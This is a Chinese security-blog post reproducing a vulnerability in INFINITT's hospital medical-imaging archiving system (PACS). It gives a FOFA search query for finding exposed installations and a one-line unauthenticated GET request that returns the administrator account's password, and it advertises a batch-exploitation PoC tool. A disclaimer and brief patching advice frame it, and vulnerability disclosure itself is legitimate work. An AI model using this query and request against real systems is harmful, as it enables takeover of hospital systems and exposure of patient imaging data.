#  【漏洞复现】英飞达医学影像存档与通信系统webservices接口存在信息泄露漏洞   
原创 清风  白帽攻防   2024-11-18 01:20  
  
## 免责声明：请勿使用本文中提到的技术进行非法测试或行为。使用本文中提供的信息或工具所造成的任何后果和损失由使用者自行承担，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
简介  
  
英飞达医学影像存档与通信系统主要用于医院影像科室，负责将日常生成的各种医学影像（如核磁共振、CT、超声、X光、红外、显微镜等设备的图像）通过不同接口（如模拟信号、DICOM协议、网络传输）进行数字化保存。这些影像数据被海量存储，并能在授权下快速调取使用，同时提供一些辅助诊断和管理功能。该系统在不同影像设备之间传输数据和组织存储数据方面发挥着重要作用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0dakQkvYTcT4pr9bd9LAZXf7uo75HCmHZyuKiaMdDTkQCuZf2ehJAWyMoX8yUkOb8BO5MILwYPKqsA/640?wx_fmt=png&from=appmsg "")  
  
漏洞描述  
英飞达医学影像存档与通信系统在/webservices/WebUserLogin.asmx/接口处存在信息泄露漏洞，攻击者无需身份验证即可  
利用该漏洞获取系统后台管理员的账户密码信息，进而登录后台，导致系统安全性严重受损。  
  
fofa语法```
"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
```  
漏洞复现```
GET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
Host: IP
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0dakQkvYTcT4pr9bd9LAZXfzTGSyib6iaXmToYhh1oDOCXWK6UExxSbFI8C2aNt48VOJZQtxq09gGXA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0dakQkvYTcT4pr9bd9LAZXfufCRwgzVRRG0MDdXRztFwicfdHxpn3V85bAhFx9qibUBE9QNKvCaIdSw/640?wx_fmt=png&from=appmsg "")  
  
批量检测（批量检测POC工具请在公众号知识星球获取）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0dakQkvYTcT4pr9bd9LAZXfGF0RXrCPv4QfCtlnb8XpyLGX37tuRZknUrNYXBVFWu6RzTW1iamW9uA/640?wx_fmt=png&from=appmsg "")  
修复建议  
  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、及时更新补丁或升级至安全版本  
  
  
  
  
网安交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yu6trpdUX0efFOzibVic3qjn100tFgpUIh7ib8g9cKajewKFM5kXP350q21SCLvlgO6yx1tlia8VYxI4j3cv57FqFg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
